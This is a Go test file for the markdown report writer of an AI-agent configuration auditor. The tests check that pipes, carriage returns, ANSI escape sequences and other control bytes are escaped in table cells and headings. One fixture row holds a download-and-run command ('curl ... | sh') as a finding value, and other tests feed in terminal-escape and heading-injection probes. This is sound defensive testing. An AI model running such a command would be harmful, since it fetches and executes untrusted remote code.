package md_test

import (
	"bytes"
	"flag"
	"os"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"github.com/manifold-security/agentaudit/finding"
	"github.com/manifold-security/agentaudit/internal/ir"
	"github.com/manifold-security/agentaudit/internal/report"
	mdreport "github.com/manifold-security/agentaudit/internal/report/md"
	"github.com/manifold-security/agentaudit/internal/report/reportfixture"
)

var update = flag.Bool("update", false, "update golden files")

func TestWrite_Golden(t *testing.T) {
	const goldenPath = "testdata/report.golden"

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, reportfixture.Report(), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	if *update {
		if err := os.WriteFile(goldenPath, buf.Bytes(), 0o644); err != nil {
			t.Fatalf("update golden %s: %v", goldenPath, err)
		}
	}

	want, err := os.ReadFile(goldenPath)
	if err != nil {
		t.Fatalf("read golden %s: %v (run with -update to generate it)", goldenPath, err)
	}
	if buf.String() != string(want) {
		t.Fatalf("Write() output mismatch\n--- got ---\n%s\n--- want ---\n%s", buf.String(), string(want))
	}
}

var unescapedPipeRe = regexp.MustCompile(`(^|[^\\])\|`)

var h2HeadingRe = regexp.MustCompile(`(?m)^## `)
var agentHeadingRe = regexp.MustCompile(`(?m)^## \(`)

func unescapedPipes(s string) int {
	return len(unescapedPipeRe.FindAllString(s, -1))
}

func findRow(t *testing.T, doc, needle string) string {
	t.Helper()
	for _, line := range strings.Split(doc, "\n") {
		if strings.Contains(line, needle) {
			return line
		}
	}
	t.Fatalf("no rendered row contains %q", needle)
	return ""
}

func TestWrite_PipeInCapabilityValueDoesNotBreakTableColumns(t *testing.T) {
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, reportfixture.Report(), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	row := findRow(t, buf.String(), "inlineshell.command")
	if !strings.Contains(row, `curl -s https://x.tld/i.sh \| sh`) {
		t.Fatalf("row = %q, want it to contain the escaped pipe %q", row, `curl -s https://x.tld/i.sh \| sh`)
	}

	const wantColumnDelimiters = 8 // one per column boundary, including the row's own leading and trailing pipe
	if got := unescapedPipes(row); got != wantColumnDelimiters {
		t.Fatalf("unescapedPipes(row) = %d, want %d (row: %q)", got, wantColumnDelimiters, row)
	}
}

// The shared fixture carries no backslash, carriage return or 0x1f, so only
// hand-built findings can exercise escapeCell's rules one at a time. A
// control byte reaches the document already escaped by report.Escape, so
// escapeCell then runs its own rules over that already-escaped spelling,
// doubling its backslash.
func TestWrite_EscapesAdversarialCellValues(t *testing.T) {
	bs := `\`
	tests := []struct {
		name  string
		value string
		want  string
	}{
		{"loneCR", "a\rb", `a\\rb`},
		{"crlf", "a\r\nb", `a\\r\\nb`},
		{"lf", "a\nb", `a\\nb`},
		{"lineSeparator", "a\u2028b", `a\\u2028b`},
		{"paragraphSeparator", "a\u2029b", `a\\u2029b`},
		{"unitSeparator", "a\x1fb", `a\\x1fb`},
		{"backslash", "a" + bs + "b", "a" + bs + bs + "b"},
		{"trailingBackslash", "a" + bs, "a" + bs + bs},
		{"pipeMidWord", "a|b", `a\|b`},
		{"middleDotMidWord", "a·b", `a\u00b7b`},
		{"backslashThenPipe", "a" + bs + "|b", "a" + bs + bs + bs + "|b"},
		{"combination", "x\r\ny|z\x1fw", `x\\r\\ny\|z\\x1fw`},
		{"ANSI erase-display", "a\x1bb", `a\\x1bb`},
		{"tab", "a\tb", `a\\tb`},
		{"verticalTab", "a\vb", `a\\vb`},
		{"del", "a\x7fb", `a\\x7fb`},
		{"c1CSI", "a\u009bb", `a\\u009bb`},
		{"rightToLeftOverride", "a\u202eb", `a\\u202eb`},
		{"invalidByte", "a" + string([]byte{0x80}) + "b", `a\\x80b`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			f := finding.Finding{
				RuleID:     "probe.rule",
				Categories: []finding.Category{"probe"},
				Capability: finding.Capability{
					Entity:     ir.EnvVar{Name: "PROBE", Value: tt.value},
					Provenance: finding.Provenance{File: "probe.json"},
				},
			}

			var buf bytes.Buffer
			if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
				t.Fatalf("Write() error = %v, want nil", err)
			}
			doc := buf.String()

			row := findRow(t, doc, "probe.rule")
			if !strings.Contains(row, tt.want) {
				t.Fatalf("row = %q, want it to contain %q", row, tt.want)
			}

			const wantColumnDelimiters = 8
			if got := unescapedPipes(row); got != wantColumnDelimiters {
				t.Fatalf("unescapedPipes(row) = %d, want %d (row: %q)", got, wantColumnDelimiters, row)
			}
			if got := len(h2HeadingRe.FindAllString(doc, -1)); got != 2 {
				t.Fatalf("doc contains %d headings, want exactly the agent heading plus the one probe heading, got:\n%s", got, doc)
			}
		})
	}
}

// Provenance reaches the Location cell through a different call site than a
// Value, so it needs its own proof that escaping still applies.
func TestWrite_ProvenanceLineEndingIsEscaped(t *testing.T) {
	f := finding.Finding{
		RuleID:     "probe.location",
		Categories: []finding.Category{"probe"},
		Capability: finding.Capability{
			Entity:     ir.Skill{Name: "solo"},
			Provenance: finding.Provenance{File: "a\rb", Key: "k"},
		},
	}

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	if bytes.ContainsRune(buf.Bytes(), '\r') {
		t.Fatalf("output contains a raw CR from Provenance.File, want it escaped")
	}
}

// A bare CR in meta.Path or a category name splits the H1 or an H2 across
// lines in a CommonMark reader, letting scanned config inject headings into
// the report.
func TestWrite_HeaderAndHeadingEscapeCarriageReturn(t *testing.T) {
	f := finding.Finding{
		RuleID:     "probe.heading",
		Categories: []finding.Category{"probe\rEVERYTHING HIDDEN"},
		Capability: finding.Capability{
			Entity:     ir.Skill{Name: "solo"},
			Provenance: finding.Provenance{File: "a.json"},
		},
	}

	var buf bytes.Buffer
	meta := mdreport.Meta{Path: "target\rdir"}
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), meta); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	if bytes.ContainsRune(buf.Bytes(), '\r') {
		t.Fatalf("doc contains a raw CR, want the header and heading both escaped")
	}
	if !strings.HasPrefix(doc, `# agentaudit · target\\rdir`+"\n") {
		t.Fatalf("doc = %q, want the H1 on one line with the CR escaped", doc)
	}
	if !strings.Contains(doc, `## probe\\rEVERYTHING HIDDEN`+"\n") {
		t.Fatalf("doc = %q, want the heading on one line with the CR escaped", doc)
	}
}

// Two reporters disagreeing about a finding's id would break any consumer
// correlating them, so md must call the shared digest, never re-derive one.
func TestWrite_IDMatchesSharedDigest(t *testing.T) {
	var buf bytes.Buffer
	rep := reportfixture.Report()
	if err := mdreport.Write(&buf, rep, mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	for _, f := range rep.Findings() {
		want := f.Digest()
		row := findRow(t, doc, f.RuleID)
		if !strings.Contains(row, "`"+want+"`") {
			t.Fatalf("row for %q = %q, want it to contain ID cell `%s`", f.RuleID, row, want)
		}
	}
}

func TestWrite_DuplicateEntityDistinctGroupsDistinctIDs(t *testing.T) {
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, reportfixture.Report(), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	codeExecIdx := strings.Index(doc, "## code-execution")
	supplyChainIdx := strings.Index(doc, "## supply-chain")
	if codeExecIdx == -1 || supplyChainIdx == -1 {
		t.Fatalf("doc missing expected headings, got:\n%s", doc)
	}

	stdioRow := findRow(t, doc, "mcp.stdio")
	unpinnedRow := findRow(t, doc, "mcp.unpinned-npx-command")

	stdioUnderCodeExec := codeExecIdx < strings.Index(doc, stdioRow)
	unpinnedUnderSupplyChain := supplyChainIdx < strings.Index(doc, unpinnedRow)
	if !stdioUnderCodeExec || !unpinnedUnderSupplyChain {
		t.Fatalf("expected mcp.stdio under ## code-execution and mcp.unpinned-npx-command under ## supply-chain, got:\n%s", doc)
	}

	if stdioRow == unpinnedRow {
		t.Fatalf("mcp.stdio and mcp.unpinned-npx-command rendered identical rows, want distinct ID/Message cells")
	}
}

// Identity() joins its parts with 0x1f, and report.Escape neutralises that
// byte regardless of source, so a raw-0x1f check alone cannot distinguish a
// row rendered through report.Describe from one that leaked the entity's raw
// Identity() instead — both would show zero raw 0x1f once escaped. This
// checks for the fully composed spelling a leaked Identity() would actually
// produce on the page: report.Escape, then escapeCell in the same order
// every cell gets — a spelling only a leak would produce.
func TestWrite_RowNeverContainsEscapedEntityIdentityString(t *testing.T) {
	rep := reportfixture.Report()
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, rep, mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	for _, f := range rep.Findings() {
		leaked := strings.ReplaceAll(report.Escape(f.Capability.Entity.Identity()), `\`, `\\`)
		leaked = strings.ReplaceAll(leaked, "|", `\|`)
		leaked = strings.ReplaceAll(leaked, "·", "\\u00b7")
		if strings.Contains(doc, leaked) {
			t.Fatalf("doc contains the escaped Entity.Identity() string %q for rule %q, want writeRow to render via report.Describe instead", leaked, f.RuleID)
		}
	}
}

func TestWrite_DegradedReportShowsScanIncomplete(t *testing.T) {
	var clean, degraded bytes.Buffer
	if err := mdreport.Write(&clean, reportfixture.Report(), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() clean error = %v, want nil", err)
	}
	if err := mdreport.Write(&degraded, reportfixture.Report().WithUnreadableSources(3), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() degraded error = %v, want nil", err)
	}

	if strings.Contains(clean.String(), "SCAN INCOMPLETE") {
		t.Fatalf("clean render contains \"SCAN INCOMPLETE\", want it absent")
	}
	if !strings.Contains(degraded.String(), "SCAN INCOMPLETE") {
		t.Fatalf("degraded render missing \"SCAN INCOMPLETE\"")
	}
	if !strings.Contains(degraded.String(), "3** unreadable source") {
		t.Fatalf("degraded render footer = %q, want it to report 3 unreadable sources", degraded.String())
	}
	if strings.Contains(clean.String(), "unreadable source") {
		t.Fatalf("clean render footer = %q, want no unreadable-source clause", clean.String())
	}
	if strings.Contains(degraded.String(), "unparsed source") {
		t.Fatalf("degraded render footer = %q, want no unparsed-source clause for an unreadable-only degradation", degraded.String())
	}
}

// A source read but not parsed degrades the markdown document the same way
// an unread one does, under its own count.
func TestWrite_UnparsedReportShowsItsOwnScanIncompleteClause(t *testing.T) {
	var both, unparsedOnly bytes.Buffer
	if err := mdreport.Write(&both, reportfixture.Report().WithUnreadableSources(3).WithUnparsedSources(1), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	if err := mdreport.Write(&unparsedOnly, finding.NewReport(nil).WithUnparsedSources(2), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	if !strings.Contains(both.String(), "3 sources could not be read and 1 source could not be parsed") {
		t.Fatalf("doc = %q, want both blind spots named in one SCAN INCOMPLETE clause", both.String())
	}
	if !strings.Contains(both.String(), "**3** unreadable sources · **1** unparsed source") {
		t.Fatalf("doc = %q, want both counts in the footer", both.String())
	}

	doc := unparsedOnly.String()
	if !strings.Contains(doc, "**SCAN INCOMPLETE**: 2 sources could not be parsed") {
		t.Fatalf("doc = %q, want the unparsed-only SCAN INCOMPLETE clause", doc)
	}
	if strings.Contains(doc, "no capabilities found") || strings.Contains(doc, "no known agent config read") {
		t.Fatalf("doc = %q, must carry neither clean claim when a source went unparsed", doc)
	}
	if strings.Contains(doc, "unreadable source") {
		t.Fatalf("doc = %q, want no unreadable-source text for an unparsed-only degradation", doc)
	}
}

func TestWrite_EmptyReportDegradedShowsScanIncompleteNoCapabilitiesFound(t *testing.T) {
	var buf bytes.Buffer
	rep := finding.NewReport(nil).WithUnreadableSources(2)
	if err := mdreport.Write(&buf, rep, mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	if !strings.Contains(doc, "SCAN INCOMPLETE") {
		t.Fatalf("doc missing \"SCAN INCOMPLETE\", got:\n%s", doc)
	}
	if !strings.Contains(doc, "no source the scan could read and parse declared a capability") {
		t.Fatalf("doc missing \"no source the scan could read and parse declared a capability\", got:\n%s", doc)
	}
	if strings.Contains(doc, "no capabilities found") || strings.Contains(doc, "no known agent config read") {
		t.Fatalf("doc carries a clean claim despite unreadable sources, got:\n%s", doc)
	}
	if !strings.HasPrefix(doc, "# agentaudit") || !strings.Contains(doc, "capabilities ·") {
		t.Fatalf("doc = %q, want the H1 and the footer rendered", doc)
	}
	if strings.Contains(doc, "## (") {
		t.Fatalf("doc contains an agent heading, want none (nothing produced anything to attribute), got:\n%s", doc)
	}
}

func TestWrite_EmptyReportShowsNoAgentHeading(t *testing.T) {
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport(nil), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	if !strings.Contains(doc, "_no known agent config read_") {
		t.Fatalf("doc missing \"_no known agent config read_\", got:\n%s", doc)
	}
	if strings.Contains(doc, "no capabilities found") {
		t.Fatalf("doc = %q, must not claim a scanned agent declared nothing when none ran", doc)
	}
	if !strings.HasPrefix(doc, "# agentaudit") || !strings.Contains(doc, "capabilities ·") {
		t.Fatalf("doc = %q, want the H1 and the footer rendered", doc)
	}
	if strings.Contains(doc, "## (") {
		t.Fatalf("doc contains an agent heading, want none, got:\n%s", doc)
	}
}

// The scanned-agent clause reaches the markdown document inside its
// emphasis marks.
func TestWrite_EmptyReportNamesTheScannedAgents(t *testing.T) {
	tests := []struct {
		name   string
		agents []string
		want   string
	}{
		{"one agent", []string{"claude-code"}, "_no capabilities found (scanned: claude-code)_\n\n"},
		{"two agents", []string{"cursor", "claude-code"}, "_no capabilities found (scanned: cursor, claude-code)_\n\n"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			if err := mdreport.Write(&buf, finding.NewReport(nil).WithScannedAgents(tt.agents), mdreport.Meta{Path: "."}); err != nil {
				t.Fatalf("Write() error = %v, want nil", err)
			}
			if got := buf.String(); !strings.Contains(got, tt.want) {
				t.Fatalf("doc = %q, want it to contain %q", got, tt.want)
			}
		})
	}
}

// A scanned agent's name reaches the clause through the same escaping a
// table cell gets: control byte, pipe and middle dot all arrive spelled
// out.
func TestWrite_EmptyReportEscapesAScannedAgentName(t *testing.T) {
	hostile := "ev\x00il | x \u00b7 y"

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport(nil).WithScannedAgents([]string{hostile}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	doc := buf.String()
	if strings.Contains(doc, hostile) {
		t.Fatalf("doc = %q, want the hostile agent name neutralised", doc)
	}
	if !strings.Contains(doc, `_no capabilities found (scanned: ev\\x00il \| x \u00b7 y)_`) {
		t.Fatalf("doc = %q, want the control byte, the pipe and the separator all spelled out", doc)
	}
}

// The markdown degraded branch also renders without the scanned-agent
// clause.
func TestWrite_DegradedEmptyReportOmitsTheScannedClause(t *testing.T) {
	r := finding.NewReport(nil).
		WithUnreadableSources(1).
		WithScannedAgents([]string{"claude-code"})

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, r, mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	doc := buf.String()
	if !strings.Contains(doc, "SCAN INCOMPLETE") {
		t.Fatalf("doc = %q, want the degraded clause", doc)
	}
	if strings.Contains(doc, "scanned:") {
		t.Fatalf("doc = %q, want no scanned-agent clause on a degraded document", doc)
	}
}

func TestWrite_FooterSingularCounts(t *testing.T) {
	f := finding.Finding{
		RuleID:     "solo.rule",
		Categories: []finding.Category{"discovery"},
		Capability: finding.Capability{
			Entity:     ir.Skill{Name: "solo"},
			Provenance: finding.Provenance{File: "a.json"},
		},
	}

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	const want = "**1** capability · **1** file · **1** category\n"
	if !strings.Contains(buf.String(), want) {
		t.Fatalf("Write() = %q, want it to contain footer %q", buf.String(), want)
	}
}

func TestWrite_FooterCountsMatchFixture(t *testing.T) {
	var buf bytes.Buffer
	rep := reportfixture.Report()
	if err := mdreport.Write(&buf, rep, mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	counts := rep.Counts()
	doc := buf.String()
	for _, want := range []string{
		"**" + strconv.Itoa(counts.Findings) + "**",
		"**" + strconv.Itoa(counts.Files) + "**",
		"**" + strconv.Itoa(counts.Categories) + "**",
	} {
		if !strings.Contains(doc, want) {
			t.Fatalf("footer missing %q, doc:\n%s", want, doc)
		}
	}
}

// report.Escape must run before escapeCell, not after: an ESC reaching the
// authority first becomes the literal text of its escape spelling, and
// escapeCell then doubles that spelling's own backslash. The reverse order
// would leave a single backslash in the raw file, yet a CommonMark reader
// displays either order identically (a backslash before "x" is literal
// either way), so this asserts on the raw document bytes, never on a
// rendered reading.
func TestWrite_EscapeRunsBeforeMarkdownEscaping(t *testing.T) {
	f := finding.Finding{
		RuleID:     "probe.order",
		Categories: []finding.Category{"probe"},
		Capability: finding.Capability{
			Entity:     ir.EnvVar{Name: "PROBE", Value: "a\x1bb"},
			Provenance: finding.Provenance{File: "probe.json"},
		},
	}

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}

	row := findRow(t, buf.String(), "probe.order")
	if !strings.Contains(row, `a\\x1bb`) {
		t.Fatalf("row = %q, want the doubled backslash that only report.Escape-then-escapeCell ordering produces", row)
	}
}

func TestWrite_H1_EscapesHazardPath(t *testing.T) {
	var buf bytes.Buffer
	meta := mdreport.Meta{Path: "target\x1b[2Jdir"}
	if err := mdreport.Write(&buf, finding.NewReport(nil), meta); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	if strings.ContainsRune(doc, '\x1b') {
		t.Fatalf("doc = %q, want the H1 path escaped", doc)
	}
	if got := strings.Count(doc, "# agentaudit"); got != 1 {
		t.Fatalf("doc has %d H1 headers, want exactly 1", got)
	}
}

func TestWrite_GroupsFindingsByProducingAgent(t *testing.T) {
	claude := finding.Finding{
		RuleID:     "claude.rule",
		Agent:      "claude-code",
		Categories: []finding.Category{"code-execution"},
		Capability: finding.Capability{Entity: ir.Skill{Name: "claude-skill"}, Provenance: finding.Provenance{File: "a.json"}},
	}
	cursor := finding.Finding{
		RuleID:     "cursor.rule",
		Agent:      "cursor",
		Categories: []finding.Category{"network"},
		Capability: finding.Capability{Entity: ir.Skill{Name: "cursor-skill"}, Provenance: finding.Provenance{File: "b.json"}},
	}

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{claude, cursor}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	claudeHeadingRe := regexp.MustCompile(`(?m)^## \(claude-code\)$`)
	cursorHeadingRe := regexp.MustCompile(`(?m)^## \(cursor\)$`)
	if got := len(claudeHeadingRe.FindAllString(doc, -1)); got != 1 {
		t.Fatalf("doc = %q, want exactly one \"## (claude-code)\" heading", doc)
	}
	if got := len(cursorHeadingRe.FindAllString(doc, -1)); got != 1 {
		t.Fatalf("doc = %q, want exactly one \"## (cursor)\" heading", doc)
	}
	claudeIdx := strings.Index(doc, "## (claude-code)")
	claudeCatIdx := strings.Index(doc, "## code-execution")
	cursorIdx := strings.Index(doc, "## (cursor)")
	cursorCatIdx := strings.Index(doc, "## network")
	if claudeIdx == -1 || claudeCatIdx == -1 || claudeIdx > claudeCatIdx {
		t.Fatalf("doc = %q, want \"## (claude-code)\" before its own category heading", doc)
	}
	if cursorIdx == -1 || cursorCatIdx == -1 || cursorIdx > cursorCatIdx {
		t.Fatalf("doc = %q, want \"## (cursor)\" before its own category heading", doc)
	}
}

func TestWrite_AgentHeadingIsTheSameLevelAsACategoryHeading(t *testing.T) {
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, reportfixture.Report(), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	if strings.Contains(buf.String(), "### ") {
		t.Fatalf("doc = %q, want no \"### \" heading anywhere (the agent heading is a peer of a category heading, not nested under it)", buf.String())
	}
}

func TestWrite_SingleAgentStillRendersTheGroupedForm(t *testing.T) {
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, reportfixture.Report(), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	if got := len(agentHeadingRe.FindAllString(buf.String(), -1)); got != 1 {
		t.Fatalf("doc has %d agent headings, want exactly 1", got)
	}
}

func TestWrite_EmptyAgentRendersEmptyParentheses(t *testing.T) {
	f := finding.Finding{
		RuleID:     "noagent.rule",
		Categories: []finding.Category{"discovery"},
		Capability: finding.Capability{Entity: ir.Skill{Name: "solo"}, Provenance: finding.Provenance{File: "a.json"}},
	}

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	if !strings.Contains(buf.String(), "## ()") {
		t.Fatalf("doc = %q, want an empty-parentheses heading for an empty Agent", buf.String())
	}
}

func TestWrite_AllCategorylessFindingsRenderNoAgentHeading(t *testing.T) {
	f := finding.Finding{
		RuleID: "nocategory.rule",
		Agent:  "claude-code",
		Capability: finding.Capability{
			Entity:     ir.EnvVar{Name: "X", Value: "y"},
			Provenance: finding.Provenance{File: "a.json"},
		},
	}

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport([]finding.Finding{f}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	if agentHeadingRe.MatchString(doc) {
		t.Fatalf("doc = %q, want no agent heading when every finding is categoryless", doc)
	}
	if !strings.Contains(doc, "**1** capability · **1** file · **0** categories") {
		t.Fatalf("doc = %q, want footer \"**1** capability · **1** file · **0** categories\"", doc)
	}
}

// The md writer hand-rolls its escaping instead of using a Markdown library,
// so a pipe or a lone carriage return in an agent id needs its own case:
// HazardousReport's hazard is an ESC sequence carrying neither byte, so it
// cannot exercise this path.
func TestWrite_AgentHeading_EscapesPipeAndCarriageReturn(t *testing.T) {
	pipeFinding := finding.Finding{
		RuleID:     "pipe.rule",
		Agent:      "a|b",
		Categories: []finding.Category{"discovery"},
		Capability: finding.Capability{Entity: ir.Skill{Name: "solo"}, Provenance: finding.Provenance{File: "a.json"}},
	}
	crFinding := finding.Finding{
		RuleID:     "cr.rule",
		Agent:      "a\rb",
		Categories: []finding.Category{"discovery"},
		Capability: finding.Capability{Entity: ir.Skill{Name: "solo"}, Provenance: finding.Provenance{File: "a.json"}},
	}
	controlFinding := finding.Finding{
		RuleID:     "control.rule",
		Agent:      "ab",
		Categories: []finding.Category{"discovery"},
		Capability: finding.Capability{Entity: ir.Skill{Name: "solo"}, Provenance: finding.Provenance{File: "a.json"}},
	}

	var controlBuf bytes.Buffer
	if err := mdreport.Write(&controlBuf, finding.NewReport([]finding.Finding{controlFinding}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() control error = %v, want nil", err)
	}
	wantH2 := len(h2HeadingRe.FindAllString(controlBuf.String(), -1))

	var pipeBuf bytes.Buffer
	if err := mdreport.Write(&pipeBuf, finding.NewReport([]finding.Finding{pipeFinding}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() pipe error = %v, want nil", err)
	}
	pipeDoc := pipeBuf.String()
	if !strings.Contains(pipeDoc, `## (a\|b)`) {
		t.Fatalf("doc = %q, want the heading to contain the escaped pipe %q", pipeDoc, `a\|b`)
	}
	if got := len(h2HeadingRe.FindAllString(pipeDoc, -1)); got != wantH2 {
		t.Fatalf("doc has %d H2 headings, want %d (an unescaped pipe must not fabricate a table column read as a heading)", got, wantH2)
	}

	var crBuf bytes.Buffer
	if err := mdreport.Write(&crBuf, finding.NewReport([]finding.Finding{crFinding}), mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() cr error = %v, want nil", err)
	}
	crDoc := crBuf.String()
	if bytes.ContainsRune(crBuf.Bytes(), '\r') {
		t.Fatalf("doc contains a raw CR, want it escaped")
	}
	if !strings.Contains(crDoc, `a\\rb`) {
		t.Fatalf("doc = %q, want the heading to contain the escaped CR %q", crDoc, `a\\rb`)
	}
	if got := len(h2HeadingRe.FindAllString(crDoc, -1)); got != wantH2 {
		t.Fatalf("doc has %d H2 headings, want %d (a raw CR must not split the heading into two CommonMark lines)", got, wantH2)
	}
}

// The header (meta.Path) and category heading (group.Category) call sites
// are pinned separately by TestWrite_H1_EscapesHazardPath and
// TestWrite_HeaderAndHeadingEscapeCarriageReturn.
func TestWrite_HazardousReport_NoRawEscapeByteInDocument(t *testing.T) {
	rep := reportfixture.HazardousReport()

	var buf bytes.Buffer
	if err := mdreport.Write(&buf, rep, mdreport.Meta{Path: "."}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	doc := buf.String()

	// Execution proof: the render actually produced every row it claims to,
	// so the absence check below is not passing on empty output. Every
	// HazardousReport RuleID starts with "hazard", so counting that prefix
	// excludes the header and separator lines every group table also has.
	wantRows := rep.Counts().Findings
	if gotRows := strings.Count(doc, "| hazard"); gotRows != wantRows {
		t.Fatalf("Write() rendered %d table rows, want %d\ndoc:\n%s", gotRows, wantRows, doc)
	}
	if !strings.Contains(doc, `\x1b[2J`) {
		t.Fatalf("Write() = %q, want it to contain the escaped hazard spelling", doc)
	}
	if strings.ContainsRune(doc, '\x1b') {
		t.Fatalf("Write() output contains a raw ESC byte, want it escaped everywhere\ndoc:\n%s", doc)
	}
}

// The H1 separates "agentaudit" from the scanned path with the reporter's own
// " · ", so a directory name spelling that separator reads as though the path
// ended where the name says it does rather than where it really does.
func TestWrite_H1_EscapesItsOwnSeparator(t *testing.T) {
	var buf bytes.Buffer
	if err := mdreport.Write(&buf, finding.NewReport(nil), mdreport.Meta{Path: "proj · evil"}); err != nil {
		t.Fatalf("Write() error = %v, want nil", err)
	}
	h1 := strings.SplitN(buf.String(), "\n", 2)[0]

	if got := strings.Count(h1, "·"); got != 1 {
		t.Fatalf("H1 %q holds %d middle dots, want 1 (the reporter's own separator)", h1, got)
	}
	if !strings.HasSuffix(h1, `proj \u00b7 evil`) {
		t.Fatalf("H1 %q, want the scanned name whole with its separator escaped", h1)
	}
}
